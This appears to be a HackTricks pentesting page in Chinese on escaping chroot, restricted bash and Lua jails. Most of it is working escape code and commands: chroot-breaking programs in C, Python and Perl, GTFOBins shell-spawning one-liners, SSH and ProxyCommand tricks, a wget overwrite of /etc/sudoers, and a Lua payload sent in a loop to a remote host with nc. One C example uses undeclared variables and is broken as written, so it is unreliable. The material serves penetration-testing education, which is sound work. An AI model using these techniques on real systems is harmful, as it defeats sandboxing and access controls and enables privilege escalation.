# Escaping from Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**在** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **中搜索你是否可以执行具有 "Shell" 属性的任意 binary**

## Chroot Escapes

摘自 [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)：chroot 机制**并非用于防御**具有恶意篡改意图的**特权**（**root**）**用户**。在大多数系统中，chroot context 无法正确嵌套，拥有**足够权限**的 chroot 程序**可能执行第二次 chroot，从而 break out**。\
通常来说，这意味着要 escape，你需要在 chroot 内成为 root。

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) 被创建用于滥用以下场景并从 `chroot` 中 scape。

### Root + CWD

> [!WARNING]
> 如果你在 chroot 内是 **root**，你**可以通过创建**另一个 chroot 来 **escape**。这是因为 2 个 chroot 无法共存（在 Linux 中），所以如果你创建一个文件夹，然后以**位于该文件夹外部**的状态在这个新文件夹上**创建一个新的 chroot**，此时你将位于**新的 chroot 外部**，因此你会处于 FS 中。
>
> 这是因为通常 chroot **不会**将你的工作目录移动到指定目录，所以你可以创建一个 chroot，但仍位于其外部。

通常你不会在 chroot jail 中找到 `chroot` binary，但你**可以编译、上传并执行**一个 binary：

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> 这与前一种情况类似，但在本例中，**attacker 将一个指向当前目录的 file descriptor 保存下来**，然后**在一个新文件夹中创建 chroot**。最后，由于他在 chroot **之外**拥有对该 **FD** 的**访问权限**，因此可以访问它并**逃逸**。

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD 可以通过 Unix Domain Sockets 传递，因此：
>
> - 创建一个子进程（fork）
> - 创建 UDS，使父进程和子进程能够通信
> - 在子进程中对不同的文件夹运行 chroot
> - 在父进程中创建一个指向新子进程 chroot 外部文件夹的 FD
> - 使用 UDS 将该 FD 传递给子进程
> - 子进程 chdir 到该 FD；由于它位于自身 chroot 的外部，因此可以逃逸 jail

### Root + Mount

> [!WARNING]
>
> - 将根设备（/）挂载到 chroot 内部的一个目录
> - chroot 到该目录
>
> 这在 Linux 中是可行的

### Root + /proc

> [!WARNING]
>
> - 将 procfs 挂载到 chroot 内部的一个目录（如果尚未挂载）
> - 查找具有不同 root/cwd 条目的 pid，例如：/proc/1/root
> - chroot 到该条目

### Root(?) + Fork

> [!WARNING]
>
> - 创建一个 Fork（子进程），并 chroot 到文件系统中更深层的另一个文件夹，然后 CD 到该文件夹
> - 从父进程中，将子进程所在的文件夹移动到子进程 chroot 之前的某个文件夹中
> - 该子进程将发现自己位于 chroot 外部

### ptrace

> [!WARNING]
>
> - 过去，用户可以从自身的某个进程中调试自己的进程……但现在默认情况下已不再可行
> - 无论如何，如果这是可行的，你可以对某个进程执行 ptrace，并在其中执行 shellcode（[参见此示例](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)）。

## Bash Jails

### Enumeration

获取有关 jail 的信息：
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### 修改 PATH

检查是否可以修改 PATH 环境变量
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### 使用 vim
```bash
:set shell=/bin/sh
:shell
```
### 分页器和帮助查看器

许多受限环境仍会提供 **分页器** 或 **帮助查看器**。与尝试重建 `PATH` 相比，利用它们通常更快。
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
如果可以使用 `git`，请记住，它的帮助输出通常会通过分页器显示：
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### 常见的 GTFOBins 单行命令

确定哪些 binaries 可访问后，先测试明显的 shell spawner：
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
如果你只能向允许的命令中 **inject arguments**（而不是自由运行它），也请检查 **GTFOArgs**。

### 创建脚本

检查你是否可以创建一个内容为 _/bin/bash_ 的可执行文件
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### 从 SSH 获取 bash

如果你是通过 ssh 访问的，通常可以要求服务器执行 **其他程序**，而不是受限的登录 shell：
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
如果 `ssh` 是本地少数被允许的二进制文件之一，请记住它也可以被滥用为 **GTFOBin**：
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### 声明
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

例如，你可以覆盖 sudoers 文件
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### 受限 shell wrappers（`git-shell`、`rssh`、`lshell`）

某些环境不会将你置于普通的 `rbash` 中，而是置于 **wrappers**，例如 `git-shell`、`rssh` 或 `lshell`：

- `git-shell` 只接受服务端 Git 命令，以及 `~/git-shell-commands/` 中存在的任何内容。如果该目录存在，运行 `help` 以枚举允许的自定义操作。如果你可以在其中**写入**，放入该目录的任何可执行文件都会变得可访问。
- `rssh` / `lshell` 通常只允许 `scp`、`sftp`、`rsync` 或 Git-style 操作。在这些情况下，首先关注**文件写入原语**：将 `authorized_keys`、shell startup file 或 helper script 上传到可写位置，然后使用 `ssh -t ...` 重新连接。
- 如果 wrapper 只过滤命令行，则枚举可访问的 binaries，然后转向 **GTFOBins / GTFOArgs**。

### 其他 tricks

另外检查：

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**以下页面也可能很有用：**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

关于从 python jails 中逃逸的 tricks，请参见以下页面：


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

你可以在此页面中找到在 lua 内部可访问的 global functions：[https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**使用 command execution 执行 Eval：**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
一些**无需使用点号即可调用库中函数**的技巧：
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
枚举库的函数：
```bash
for k,v in pairs(string) do print(k,v) end
```
请注意，每次在**不同的 lua 环境中执行前面的 one liner 时，函数的顺序都会发生变化**。因此，如果你需要执行某个特定函数，可以通过加载不同的 lua 环境并调用 le library 的第一个函数来实施 brute force attack：
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**获取交互式 lua shell**：如果你处于受限的 lua shell 中，可以通过调用以下命令获取一个新的 lua shell（希望是不受限的）：
```bash
debug.debug()
```
## 参考资料

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
